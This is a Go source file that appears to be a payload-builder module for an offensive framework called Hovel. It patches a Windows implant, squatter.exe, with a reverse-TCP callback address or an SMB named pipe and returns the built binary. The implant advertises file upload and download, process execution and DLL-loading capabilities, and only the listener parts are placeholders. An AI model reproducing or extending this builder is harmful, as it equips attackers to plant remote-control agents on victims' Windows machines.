// Command squatter-provider is the Hovel payload_provider module for Squatter.
//
// This scaffold exposes the provider RPC shape and placeholder metadata without
// implementing a real listener, SMB named-pipe transport, or Windows agent.
package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"unicode/utf16"

	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
)

const (
	version      = "v0.1.0"
	payloadName  = "squatter"
	platform     = "windows"
	arch         = "x86"
	minOS        = "windows-xp-sp3"
	formatPEEXE  = "pe-exe"
	reverseTCP   = "reverse-tcp"
	smbNamedPipe = "smb-named-pipe"

	payloadEnvPath = "SQUATTER_PAYLOAD_PATH"
	payloadRunfile = "payloads/squatter/windows/squatter.exe"

	payloadConfigMagic          = "SQCFG001"
	payloadConfigKindOffset     = 8
	payloadConfigHostOffset     = 12
	payloadConfigPortOffset     = 16
	payloadConfigPipeOffset     = 18
	payloadConfigPipeCharacters = 128
	payloadConfigKindReverseTCP = 1
	payloadConfigKindSMBPipe    = 2
)

// Provider implements Hovel's payload_provider contract for Squatter.
type Provider struct {
	lp listeningPost
}

func newProvider() Provider {
	return Provider{lp: newPlaceholderLP()}
}

func (p Provider) listeningPost() listeningPost {
	if p.lp == nil {
		return newPlaceholderLP()
	}
	return p.lp
}

func (Provider) Info() hovel.Info {
	return hovel.Info{
		Name:        payloadName,
		Version:     version,
		Type:        hovel.TypePayloadProvider,
		Summary:     "Build Squatter Windows payload artifacts.",
		Description: "Core Hovel payload provider scaffold for Squatter.",
		Tags:        []string{"payload_provider", "squatter", "windows", "lab", "dangerous"},
	}
}

func (Provider) Schema() hovel.Schema {
	return hovel.Schema{
		ChainConfig: []hovel.Requirement{
			enumReq("payload.transport", "Payload transport.", reverseTCP, smbNamedPipe),
			enumReq("payload.format", "Payload artifact format.", formatPEEXE),
			hovel.Req("payload.lhost", "host", "Reverse TCP listener host."),
			hovel.Req("payload.lport", "port", "Reverse TCP listener port."),
			hovel.Req("payload.pipe", "string", "SMB named pipe for post-throw Squatter comms."),
		},
		Outputs: map[string]any{
			"payloads": "per-target Squatter payload artifact set",
		},
	}
}

func enumReq(key, description string, allowed ...string) hovel.Requirement {
	req := hovel.Req(key, "enum", description)
	req.Allowed = allowed
	return req
}

func (Provider) Run(ctx *hovel.Context) (hovel.Result, error) {
	ctx.Log.Info("squatter provider execute placeholder", "target", ctx.Target)
	return hovel.Ok(
		map[string]any{"status": "provider lifecycle is not wired into throws yet"},
		hovel.WithSummary("squatter provider placeholder completed"),
	), nil
}

func (Provider) ListPayloads(query hovel.PayloadQuery) ([]hovel.PayloadInfo, error) {
	transport := query.Transport
	if transport == "" {
		return []hovel.PayloadInfo{
			payloadInfo(reverseTCP),
			payloadInfo(smbNamedPipe),
		}, nil
	}
	return []hovel.PayloadInfo{payloadInfo(transport)}, nil
}

func (Provider) ResolvePayload(query hovel.PayloadQuery) (hovel.PayloadInfo, error) {
	transport := query.Transport
	if transport == "" {
		return hovel.PayloadInfo{}, fmt.Errorf("payload transport is required")
	}
	return payloadInfo(transport), nil
}

func (p Provider) PrepareListener(req hovel.PrepareListenerRequest) (hovel.ListenerRef, error) {
	return p.listeningPost().PrepareListener(req)
}

func (Provider) GeneratePayload(req hovel.GeneratePayloadRequest) (hovel.PayloadArtifactSet, error) {
	body, err := loadPayloadBinary()
	if err != nil {
		return hovel.PayloadArtifactSet{}, err
	}
	body = append([]byte(nil), body...)
	if err := patchPayloadConfig(body, req); err != nil {
		return hovel.PayloadArtifactSet{}, err
	}
	sum := sha256.Sum256(body)
	artifact := hovel.PayloadArtifact{
		Name:     "squatter.exe",
		Role:     "primary",
		Format:   formatPEEXE,
		Encoding: "base64",
		Bytes:    base64.StdEncoding.EncodeToString(body),
		Size:     int64(len(body)),
		SHA256:   hex.EncodeToString(sum[:]),
	}
	return hovel.PayloadArtifactSet{
		Primary:   artifact,
		Artifacts: []hovel.PayloadArtifact{artifact},
	}, nil
}

func patchPayloadConfig(body []byte, req hovel.GeneratePayloadRequest) error {
	offset := strings.Index(string(body), payloadConfigMagic)
	if offset < 0 {
		return fmt.Errorf("squatter payload config marker %q not found", payloadConfigMagic)
	}
	if len(body) < offset+payloadConfigPipeOffset+(payloadConfigPipeCharacters*2) {
		return fmt.Errorf("squatter payload config blob is truncated")
	}

	transport := req.Config["payload.transport"]
	if transport == "" {
		if strings.Contains(req.PayloadID, "/"+smbNamedPipe+"/") {
			transport = smbNamedPipe
		} else {
			transport = reverseTCP
		}
	}

	switch transport {
	case reverseTCP:
		return patchReverseTCPConfig(body[offset:], req)
	case smbNamedPipe:
		return patchNamedPipeConfig(body[offset:], req)
	default:
		return fmt.Errorf("unsupported squatter transport %q", transport)
	}
}

func patchReverseTCPConfig(config []byte, req hovel.GeneratePayloadRequest) error {
	host := req.Config["payload.lhost"]
	portText := req.Config["payload.lport"]
	if req.Listener != nil {
		if req.Listener.Host != "" {
			host = req.Listener.Host
		}
		if req.Listener.Port != 0 {
			portText = strconv.Itoa(req.Listener.Port)
		}
	}
	if host == "" {
		host = "127.0.0.1"
	}
	if portText == "" {
		portText = "4444"
	}

	ip := net.ParseIP(host).To4()
	if ip == nil {
		return fmt.Errorf("payload.lhost must be an IPv4 literal for the current Squatter runtime: %q", host)
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		return fmt.Errorf("payload.lport must be a TCP port: %q", portText)
	}

	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindReverseTCP)
	copy(config[payloadConfigHostOffset:payloadConfigHostOffset+4], ip)
	binary.LittleEndian.PutUint16(config[payloadConfigPortOffset:], uint16(port))
	return nil
}

func patchNamedPipeConfig(config []byte, req hovel.GeneratePayloadRequest) error {
	pipe := req.Config["payload.pipe"]
	if pipe == "" {
		pipe = `\\.\pipe\squatter`
	}
	if !strings.HasPrefix(pipe, `\\`) {
		pipe = `\\.\pipe\` + pipe
	}

	encoded := utf16.Encode([]rune(pipe))
	if len(encoded) >= payloadConfigPipeCharacters {
		return fmt.Errorf("payload.pipe is too long for Squatter config")
	}

	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindSMBPipe)
	for index := 0; index < payloadConfigPipeCharacters; index++ {
		value := uint16(0)
		if index < len(encoded) {
			value = encoded[index]
		}
		binary.LittleEndian.PutUint16(
			config[payloadConfigPipeOffset+(index*2):],
			value,
		)
	}
	return nil
}

func loadPayloadBinary() ([]byte, error) {
	var candidates []string

	if explicit := os.Getenv(payloadEnvPath); explicit != "" {
		candidates = append(candidates, explicit)
	}

	if runfiles := os.Getenv("RUNFILES_DIR"); runfiles != "" {
		candidates = appendRunfileCandidates(candidates, runfiles)
	}

	if exe, err := os.Executable(); err == nil {
		candidates = appendRunfileCandidates(candidates, exe+".runfiles")
	}

	candidates = append(candidates,
		filepath.Join("bazel-bin", payloadRunfile),
		filepath.Join("payloads", "squatter", "windows", "squatter.exe"),
	)

	for _, candidate := range candidates {
		body, err := os.ReadFile(candidate)
		if err == nil {
			return body, nil
		}
	}

	return nil, fmt.Errorf("squatter payload binary not found; set %s or run through Bazel runfiles", payloadEnvPath)
}

func appendRunfileCandidates(candidates []string, root string) []string {
	return append(candidates,
		filepath.Join(root, "_main", payloadRunfile),
		filepath.Join(root, "hovel", payloadRunfile),
		filepath.Join(root, payloadRunfile),
	)
}

func (p Provider) ConnectSession(req hovel.ConnectSessionRequest) (hovel.SessionRef, error) {
	return p.listeningPost().ConnectSession(req)
}

func (p Provider) CleanupPayload(req hovel.CleanupPayloadRequest) (hovel.CleanupResult, error) {
	return p.listeningPost().Cleanup(req)
}

func (Provider) ReadPayloadChunk(req hovel.ReadPayloadChunkRequest) (hovel.PayloadChunk, error) {
	return hovel.PayloadChunk{
		Handle:   req.Handle,
		Offset:   req.Offset,
		Data:     "",
		EOF:      true,
		Encoding: "base64",
	}, nil
}

func payloadInfo(transport string) hovel.PayloadInfo {
	info := hovel.PayloadInfo{
		ID:           fmt.Sprintf("squatter/%s/%s/%s/%s/%s", platform, arch, minOS, transport, formatPEEXE),
		Name:         payloadName,
		Version:      version,
		Platform:     platform,
		Arch:         arch,
		MinOS:        minOS,
		TestedOS:     []string{minOS},
		Formats:      []string{formatPEEXE},
		Capabilities: capabilities(),
		Transport: hovel.PayloadTransport{
			Kind:      transport,
			Encrypted: false,
		},
		Session: hovel.PayloadSession{
			Kind:  "agent",
			Owner: "payload_provider",
		},
	}
	switch transport {
	case reverseTCP:
		info.Session.Acquisition = "callback"
		info.Session.RequiresPreThrowListener = true
	case smbNamedPipe:
		info.Session.Acquisition = "post_throw_connect"
		info.Session.RequiresPostThrowConnect = true
	}
	return info
}

func capabilities() []string {
	return []string{
		"file.get",
		"file.put",
		"process.exec",
		"process.tasklist",
		"library.rundll",
	}
}

func main() {
	hovel.Serve(newProvider())
}
